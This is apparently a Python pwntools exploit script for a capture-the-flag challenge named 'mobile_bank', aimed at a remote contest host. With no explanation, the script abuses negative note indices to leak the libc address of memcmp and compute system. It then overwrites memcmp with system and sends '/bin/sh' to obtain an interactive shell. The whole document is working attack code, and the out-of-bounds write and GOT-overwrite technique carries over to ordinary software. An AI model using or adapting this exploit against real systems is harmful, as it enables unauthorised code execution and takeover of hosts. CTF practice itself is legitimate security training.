from pwn import *

def setid(num):
	r.sendline("2")
	r.recvuntil(":")
	r.sendline(str(num))
	r.recvuntil(":")

def makenote(text):
	r.sendline("3")
	r.recvuntil(":")
	r.sendline(text)
	r.recvuntil("choice:")

r = remote("pwn-04.v7frkwrfyhsjtbpfcppnu.ctfz.one", 1337)
#r = process(["qemu-arm", "mobile_bank.45115ff5f655d94fc26cb5244928b3fc"])
#raw_input()
#raw_input()
#r.interactive()
r.recvuntil("choice:")

r.sendline("6")
r.recvuntil("password:")
r.sendline("A")
r.recvuntil("choice:")

setid(4)
makenote("A")

#setid(-2)
#makenote("DICC")
setid(-7)
r.sendline("5")
leak = (0xffffffff ^ abs(int(r.recvuntil(", note").split("value: ")[1].split("$")[0]))) + 1

#local memcmp: 0x567ad
#local system: 0x2c781

#remote memcmp: 40d


systemoff = 0x0002c585#0x2c781
memcmpoff = 0x0005740d#0x567ad

print "memcmp leak: " + hex(leak)
system = leak - memcmpoff + systemoff
print "system: " + hex(system)
#malloc 309
#puts 6b1

r.recvuntil("choice:")




'''
setid(-8)
r.sendline("5")
leak = (0xffffffff ^ abs(int(r.recvuntil(", note").split("value: ")[1].split("$")[0]))) + 1
print "malloc leak: " + hex(leak)
r.recvuntil("choice:")'''

setid(-7)
r.sendline("4")
r.recvuntil("value:")
r.sendline(str(systemoff - memcmpoff))
r.recvuntil("choice:")

r.sendline("6")
r.recvuntil("password:")
r.sendline("/bin/sh")


r.interactive()
